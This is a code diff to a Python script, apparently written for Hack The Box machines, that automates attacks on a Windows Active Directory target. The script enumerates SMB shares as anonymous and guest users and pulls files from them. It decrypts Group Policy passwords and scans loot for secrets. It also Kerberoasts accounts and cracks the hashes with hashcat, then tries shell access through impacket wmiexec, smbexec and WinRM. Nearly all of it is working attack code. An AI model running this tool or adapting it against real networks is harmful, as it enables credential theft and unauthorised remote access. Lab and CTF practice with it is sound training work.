@@ -2,7 +2,7 @@ import time
 import coloredlogs, logging
 import argparse
 from io import BytesIO
-from os import path
+from os import path, mkdir, remove
 import subprocess
 
 from impacket.smbconnection import SMBConnection, SessionError
@@ -18,6 +18,8 @@ import magic
 import zipfile
 
 import re
+import traceback
+import winrm
 
 # https://app.hackthebox.com/machines/Active
 
@@ -27,18 +29,20 @@ coloredlogs.install(level='DEBUG')
 
 parser = argparse.ArgumentParser(prog='WindowsSolver')
 parser.add_argument('--ip', help='target IP', required=True)
-parser.add_argument('--usernames', help='Initial list of usernames')
-parser.add_argument('--passwords', help='Initial list of passwords')
-parser.add_argument('--credentials', help='Initial list of credentials')
-parser.add_argument('--credential', help='Initial credential')
+parser.add_argument('--usernames', help='File with initial list of usernames')
+parser.add_argument('--passwords', help='File with initial list of passwords')
+parser.add_argument('--credentials', help='File with initial list of credentials, format "username:password"')
+parser.add_argument('--credential', help='Initial credential, format "username:password"')
 
 hash_file_name = path.join(gettempdir(), "hash.txt")
+remove(hash_file_name)
 
 _fid, GITLEAKS_DEFAULT_CONFIG_FILE = mkstemp()
 
 with open(GITLEAKS_DEFAULT_CONFIG_FILE, "w") as cfg:
     cfg.write(requests.get(gl_m.GITLEAKS_DEFAULT_CONFIG_FILE).text)
 
+usernames_to_test = ["", "guest"]
 usernames = set()
 passwords = set()
 
@@ -46,6 +50,7 @@ credentials = {}
 
 def save_creds(username, password):
     credentials[username] = password
+    usernames_to_test.append(username)
 
 ad_infos = {}
 
@@ -80,8 +85,7 @@ def parse_groups_xml(output):
         logger.warning(f"New credentials found : {username}:{decrypted_pass}")
         save_creds(username, decrypted_pass)
 
-def list_files_in_share(connection, share_name, path, depth):
-    tmp_dir = mkdtemp(prefix="ws_")
+def list_files_in_share(connection, share_name, path, depth, tmp_dir):
     for f in connection.listPath(share_name, path + "/*"):
         name = f.get_longname()
         if f.is_directory() and name in ['.', '..']:
@@ -89,7 +93,7 @@ def list_files_in_share(connection, share_name, path, depth):
 
         logger.warning("  "*depth +  "%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), time.ctime(float(f.get_mtime_epoch())), name))
         if f.is_directory():
-            list_files_in_share(connection, share_name, path + "/" + name, depth + 1)
+            list_files_in_share(connection, share_name, path + "/" + name, depth + 1, tmp_dir)
         else:
             fh = BytesIO()
             connection.getFile(share_name, path + "/" + name, fh.write)
@@ -98,15 +102,26 @@ def list_files_in_share(connection, share_name, path, depth):
             with open(current_file_name, "wb") as f_smb:
                 f_smb.write(output)
 
-            logger.debug(f"Type of {current_file_name} " + magic.from_file(tmp_dir + "/" + name))
+            try:
+                file_magic = magic.from_file(current_file_name)
+            except Exception as e:
+                traceback.print_exc()
+                file_magic = "Unknown"
+        
+            logger.debug(f"Type of {current_file_name} " + file_magic)
 
             if name == "Groups.xml":
                 parse_groups_xml(output)
-            elif magic.from_file(current_file_name).startswith("Zip archive data"):
-                with zipfile.ZipFile(current_file_name, 'r') as zip_ref:
-                    zip_ref.extractall(current_file_name + "_extract")
+            elif file_magic.startswith("Zip archive data"):
+                try:
+                    with zipfile.ZipFile(current_file_name, 'r') as zip_ref:
+                        zip_ref.extractall(current_file_name + "_extract")
+                except:
+                    traceback.print_exc()
+                    logger.error(f"Unable to unzip {current_file_name}")
 
-    logger.info("Scanning " + tmp_dir)
+def scan_for_secrets(tmp_dir):
+    logger.info(f"Scanning {tmp_dir} for secrets")
     logger.info(gl_c.detect(GITLEAKS_DEFAULT_CONFIG_FILE, tmp_dir))
 
 
@@ -121,12 +136,17 @@ def ldap_find_kerberoasting(ip, domain, username, password):
     with open(hash_file_name, "a") as hash_file:
         for line in output.splitlines():
             if line.startswith("$krb5tgs$"):
+                logger.info("Kerberoasting on for a new user")
                 hash_file.write(line + "\n")
 
 def crack_hashes():
     logger.warning("Hashcat in progress...")
-    hashcat_command = ["hashcat", "-a", "0", "-m", "13100", hash_file_name, "/usr/share/wordlists/rockyou.txt", "--quiet"]
-    result = subprocess.run(hashcat_command, check=True, capture_output=True)
+    hashcat_command = ["hashcat", "--runtime", "60", "-a", "0", "-m", "13100", hash_file_name, "/usr/share/wordlists/rockyou.txt", "--quiet"]
+    try:
+        result = subprocess.run(hashcat_command, check=True, capture_output=True)
+    except subprocess.CalledProcessError:
+        logger.info("Fail to crack hash")
+        return
     output = result.stdout
     logger.info(output)
 
@@ -141,19 +161,47 @@ def crack_hashes():
             save_creds(username, password.decode())
 
 def test_wmiexec(ip, domain, username, password):
+    logger.info(f"Testing wmiexec to get access as {username}")
     wmiexec_command = ["impacket-wmiexec", f"{domain}/{username}:{password}@{ip}", 'whoami /all']
     result = subprocess.run(wmiexec_command, capture_output=True)
     if result.returncode == 0:
-        logger.warning(f"Getting access to shell with {username}:{password}")
+        logger.warning(f"Getting access to shell with wmiexec {username}:{password}")
         output = result.stdout
         logger.info(output.decode())
 
+def test_smbexec(ip, domain, username, password):
+    logger.info(f"Testing smbexec to get access as {username}")
+    smbexec_command = ["impacket-smbexec", f"{domain}/{username}:{password}@{ip}", 'whoami /all']
+    result = subprocess.run(smbexec_command, capture_output=True)
+    if result.returncode == 0:
+        logger.warning(f"Getting access to shell with smbexec {username}:{password}")
+        output = result.stdout
+        logger.info(output.decode())
+
+def test_winrm(ip, domain, username, password):
+    logger.info(f"Testing winrm to get access as {username}")
+    try:
+        s = winrm.Session(ip, auth=(username, password))
+        r = s.run_cmd('whoami', ['/all'])
+        logger.info("Successfully connect with WinRM as username")
+        logger.info(r)
+    except winrm.exceptions.InvalidCredentialsError:
+        logger.warning(f"Fail to connect with WinRM as {username}")
+
+
+
 def list_shares(ip, user = "", password = ""):
+    logger.info(f"Listing shares as {user}")
+    
     connection = SMBConnection(remoteName = ip, remoteHost = ip)
     connection.login(user, password)
 
-    logger.info("Listing shares")
-    shares = connection.listShares()
+    tmp_dir = mkdtemp(prefix="ws_")
+    try:
+        shares = connection.listShares()
+    except SessionError as e:
+        logger.error(f"Unable to get shares, error: {e}")
+        return
     logger.info(f"Number of shares found: {len(shares)}")
     for s in shares:
         share_name = s.fields['shi1_netname'].fields['Data'].fields['Data'].decode("utf-16le")[:-1]
@@ -162,10 +210,12 @@ def list_shares(ip, user = "", password = ""):
         try:
             connection.connectTree(share_name)
             logger.warning(base_msg + "Readable")
-            list_files_in_share(connection, share_name, '', depth = 0)
+            mkdir(tmp_dir + "/" + share_name)
+            list_files_in_share(connection, share_name, '', depth = 0, tmp_dir=tmp_dir + "/" + share_name)
         except SessionError as e:
             logger.info(base_msg + "Not readable")
             logger.debug(e)
+        scan_for_secrets(tmp_dir)
 
 def sync_time(ip):
     logger.info("Syncing time with target...")
@@ -177,7 +227,7 @@ def sync_time(ip):
         logger.error("Add '<username> ALL=(root) /usr/sbin/rdate -vn *' to /etc/sudoers to allow the script to update it automatically")
 
 def list_users(ip, domain, username, password):
-    logger.info("Listing RPC uers...")
+    logger.info(f"Listing RPC users as {username}...")
     regex = r".*: .*\\(.*) \((.*)\)"
     sid_command = ["impacket-lookupsid", f"{domain}/{username}:{password}@{ip}"]
     result = subprocess.run(sid_command, capture_output=True)
@@ -198,9 +248,9 @@ if __name__ =="__main__":
     args = parser.parse_args()
     ip = args.ip
 
-    if credentials in args.credentials and ":" in credentials:
-        username = credentials.split(":")[0]
-        password = ":".join(credentials.split(":")[1:])
+    if args.credential is not None and ":" in args.credential:
+        username = args.credential.split(":")[0]
+        password = ":".join(args.credential.split(":")[1:])
         save_creds(username, password)
 
     sync_time(ip)
@@ -210,29 +260,31 @@ if __name__ =="__main__":
     domain = ad_infos['domain']
     logger.warning(f"Domain: {domain}")
 
-
-    for username, password in [('',''), ('guest', ''), *credentials.items()]:
+    i = 0
+    while i < len(usernames_to_test):
+        username = usernames_to_test[i]
+        password = credentials.get(username, "")
         list_users(ip, domain, username, password)
 
-    for username in ['', 'guest', *usernames]:
         try:
             list_shares(ip, user=username, password='')
-        except:
+        except Exception:
             logger.info(f"Unable to list SMB with {username}")
 
-    for username, password in [('',''), ('guest', ''), *credentials.items()]:
         try:
             list_shares(ip, user=username, password=password)
-        except:
+        except Exception as e:
             logger.info(f"Unable to list SMB with {username}:{password}")
+            logger.debug(e)
 
-    for username, password in credentials.items():
         ldap_find_kerberoasting(ip, domain, username, password)
 
-    crack_hashes()
-
-    for username, password in credentials.items():
         test_wmiexec(ip, domain, username, password)
+        test_smbexec(ip, domain, username, password)
+        test_winrm(ip, domain, username, password)
 
+        i = i + 1
+
+    crack_hashes()
 
 
